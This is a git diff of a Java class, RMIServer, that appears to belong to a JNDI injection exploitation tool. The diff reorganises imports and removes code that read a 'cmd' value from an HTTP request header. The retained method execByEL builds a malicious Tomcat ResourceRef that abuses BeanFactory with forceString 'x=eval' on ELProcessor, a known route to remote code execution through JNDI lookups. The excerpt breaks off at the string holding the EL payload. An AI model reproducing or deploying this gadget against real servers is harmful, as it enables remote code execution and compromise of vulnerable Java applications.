@@ -1,47 +1,25 @@
 package com.qi4l.jndi;
 
 
-import java.io.BufferedInputStream;
-import java.io.BufferedOutputStream;
-import java.io.DataInputStream;
-import java.io.DataOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
-import java.io.ObjectStreamClass;
-import java.io.OutputStream;
+import com.qi4l.jndi.gadgets.Config.Config;
+import com.qi4l.jndi.gadgets.utils.Reflections;
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import org.apache.naming.ResourceRef;
+import sun.rmi.server.UnicastServerRef;
+import sun.rmi.transport.TransportConstants;
+
+import javax.naming.Reference;
+import javax.naming.StringRefAddr;
+import javax.net.ServerSocketFactory;
+import java.io.*;
 import java.lang.reflect.Field;
-import java.net.InetSocketAddress;
-import java.net.ServerSocket;
-import java.net.Socket;
-import java.net.SocketException;
-import java.net.URL;
-import java.net.URLClassLoader;
+import java.net.*;
 import java.rmi.MarshalException;
 import java.rmi.server.ObjID;
 import java.rmi.server.RemoteObject;
 import java.rmi.server.UID;
 import java.util.Arrays;
-
-import javax.naming.Reference;
-import javax.naming.StringRefAddr;
-import javax.net.ServerSocketFactory;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-
-import com.qi4l.jndi.gadgets.Config.Config;
-import com.qi4l.jndi.gadgets.utils.Reflections;
-import com.sun.jndi.rmi.registry.ReferenceWrapper;
-
-import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
-import org.apache.naming.ResourceRef;
-import org.springframework.beans.factory.annotation.Autowired;
-import org.springframework.web.context.request.RequestAttributes;
-import org.springframework.web.context.request.RequestContextHolder;
-import org.springframework.web.context.request.ServletRequestAttributes;
-import sun.rmi.server.UnicastServerRef;
-import sun.rmi.transport.TransportConstants;
 
 import static org.fusesource.jansi.Ansi.ansi;
 
@@ -287,14 +265,8 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
         return true;
     }
 
-    @Autowired
     public static ResourceRef execByEL() {
 
-        RequestAttributes   requestAttributes = RequestContextHolder.getRequestAttributes();
-        HttpServletRequest  httprequest       = ((ServletRequestAttributes) requestAttributes).getRequest();
-        HttpServletResponse httpresponse      = ((ServletRequestAttributes) requestAttributes).getResponse();
-
-        String      cmd = httprequest.getHeader("cmd");
         ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "x=eval"));
         ref.add(new StringRefAddr("x", String.format(
